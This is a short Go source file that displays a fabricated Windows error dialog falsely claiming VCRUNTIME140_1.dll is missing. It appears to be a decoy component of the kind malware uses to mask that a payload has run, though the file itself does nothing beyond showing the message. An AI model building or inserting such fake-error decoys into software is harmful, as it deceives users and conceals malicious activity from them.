package FakeError

import (
	"syscall"
	"unsafe"
)

func Show() {
	var title, text *uint16
	title, _ = syscall.UTF16PtrFromString("Missing Dependencies - Fatal Error")
	text, _ = syscall.UTF16PtrFromString("The code execution cannot proceed because VCRUNTIME140_1.dll was not found. Reinstalling the program may fix this problem.")
	syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(0, uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(title)), 0)
}
